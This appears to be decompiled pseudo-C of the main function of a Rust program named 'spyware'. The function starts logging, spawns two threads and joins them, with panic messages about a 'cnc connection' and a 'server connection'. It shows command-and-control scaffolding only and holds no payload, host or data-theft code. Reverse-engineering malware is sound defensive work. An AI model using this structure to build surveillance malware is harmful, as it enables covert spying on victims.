
  int64_t spyware::main::h0c167b4c5fedcce2()

{
    spyware::init_logging::h71d90daabdd6a317();
    int128_t var_d8;
    char const* const var_70;
    
    if (core::sync::atomic::atomic_load::h8c88032dab18ab12() >= 3)
    {
        var_d8 = &data_4b9430;
        *var_d8[8] = 1;
        int64_t var_c8_1 = 8;
        int64_t var_c0;
        var_c0 = {0};
        int64_t rax_1 = log::__private_api::loc::he75f2f86c1ff97b9(&data_4b9440);
        var_70 = "spyware:Successfully connected t…";
        int64_t var_68_1 = 7;
        char const* const var_60_1 = "spyware:Successfully connected t…";
        int64_t var_58_1 = 7;
        int64_t var_50_1 = rax_1;
        log::__private_api::log::h13afddf373bd7d7f(&var_d8, 3, &var_70);
    }
    
    int64_t var_90 = -0x8000000000000000;
    int64_t var_a0 = 0;
    char var_78 = 0;
    int64_t var_80;
    int64_t var_b8 = var_80;
    char var_b0 = 0;
    int32_t var_77;
    int32_t var_af = var_77;
    int16_t var_73;
    int16_t var_ab = var_73;
    char var_71;
    char var_a9 = var_71;
    int64_t var_c8_2 = var_90;
    int64_t var_88;
    int64_t var_c0_1 = var_88;
    var_d8 = var_a0;
    std::thread::Builder::spawn_unchecked::hebf060dfae3bacc5(&var_70, &var_d8);
    int128_t var_48;
    core::result::Result$LT$T$C$E$GT$::expect::h0214701cb0e2f56b(&var_48, &var_70);
    std::thread::Builder::spawn_unchecked::h346b3a5527f731fa(&var_d8, &var_a0);
    int128_t var_28;
    core::result::Result$LT$T$C$E$GT$::expect::h0214701cb0e2f56b(&var_28, &var_d8);
    int128_t var_18;
    var_c8_2 = var_18;
    var_d8 = var_28;
    int64_t rax_8;
    int64_t rdx_2;
    rax_8 = std::thread::JoinInner$LT$T$GT$::join::hba541073fdcb0e40(&var_d8);
    core::result::Result$LT$T$C$E$GT$::expect::h4bc56609d4fa5fe6(rax_8, rdx_2, 
        "The cnc connection has panicked.…", 0x20);
    int128_t var_38;
    var_c8_2 = var_38;
    var_d8 = var_48;
    int64_t result;
    int64_t rdx_3;
    result = std::thread::JoinInner$LT$T$GT$::join::hba541073fdcb0e40(&var_d8);
    core::result::Result$LT$T$C$E$GT$::expect::h4bc56609d4fa5fe6(result, rdx_3, 
        "The server connection has panick…", 0x23);
    return result;
}
